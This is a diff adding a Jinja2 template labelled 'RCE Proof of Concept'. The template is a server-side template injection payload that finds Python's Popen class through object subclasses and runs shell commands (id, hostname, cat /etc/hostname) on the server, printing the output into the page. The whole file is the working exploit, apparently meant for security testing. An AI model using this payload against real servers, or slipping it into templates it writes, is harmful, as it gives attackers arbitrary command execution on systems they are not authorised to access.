@@ -1,0 +1,12 @@
+{% extends "base.html" %}
+{% block content %}
+<h1>RCE Proof of Concept</h1>
+<pre>
+{% for cls in ''.__class__.__mro__[1].__subclasses__() %}
+{% if cls.__name__ == 'Popen' %}
+COMMAND OUTPUT: {{ cls('id && hostname && cat /etc/hostname', shell=True, stdout=-1).communicate()[0].decode() }}
+{% endif %}
+{% endfor %}
+</pre>
+{{ super() }}
+{% endblock %}
